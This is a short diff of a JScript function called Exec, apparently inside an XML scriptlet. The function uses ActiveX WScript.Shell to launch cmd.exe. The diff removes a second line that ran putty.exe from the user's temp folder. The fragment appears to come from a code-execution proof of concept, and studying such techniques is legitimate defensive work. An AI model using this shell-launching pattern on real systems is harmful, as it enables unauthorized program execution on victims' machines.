@@ -26,8 +26,7 @@
 	function Exec()
 	{
 		var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
-		var t = new ActiveXObject("WScript.Shell").Run("C:\\Users\\%USERNAME%\\AppData\\local\\temp\\putty.exe");
-		
+	
 	}
 	
 ]]>
